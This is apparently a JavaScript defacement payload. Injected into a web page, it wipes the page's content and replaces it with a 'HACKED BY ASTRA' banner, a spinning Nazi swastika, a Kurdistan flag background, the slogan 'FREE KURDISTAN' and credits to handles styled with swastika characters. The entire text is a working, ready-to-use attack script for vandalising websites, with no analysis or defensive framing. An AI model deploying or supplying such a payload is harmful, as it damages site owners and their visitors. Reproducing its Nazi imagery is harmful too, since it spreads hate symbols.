document.documentElement.innerHTML = '';
document.write(`
<html>
<head>
  <title>HACKED BY ASTRA</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      background: black;
      font-family: 'Courier New', monospace;
      color: white;
    }

    .background-img {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      z-index: -1;
    }

    .center-image {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 200px;
      height: auto;
      transform: translate(-50%, -50%);
      animation: spin 6s linear infinite;
      z-index: 0;
      opacity: 0.95;
    }

    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    .glitch {
      position: absolute;
      top: 10%;
      width: 100%;
      text-align: center;
      font-size: 3em;
      color: #fff;
      text-shadow: 0 0 5px red, 0 0 10px cyan;
      animation: glitch 0.4s infinite;
      z-index: 1;
    }

    .glitch div {
      margin: 0.2em 0;
    }

    @keyframes glitch {
      0% { text-shadow: 2px 2px red, -2px -2px cyan; }
      50% { text-shadow: -2px 2px red, 2px -2px cyan; }
      100% { text-shadow: 2px -2px red, -2px 2px cyan; }
    }
  </style>
</head>
<body>
  <img class="background-img" src="https://upload.wikimedia.org/wikipedia/commons/3/35/Flag_of_Kurdistan.svg">
  <img class="center-image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bd/National_Socialist_swastika.svg/300px-National_Socialist_swastika.svg.png">
  <div class="glitch">
    <div><strong>HACKED BY ASTRA</strong></div>
    <div style="font-size:0.8em;">FREE KURDISTAN</div>
    <div style="font-size:0.6em;">Thanks to ✟lum, WI卐P, MᛋᛋEF and ꖦYX404</div>
  </div>
</body>
</html>
`);
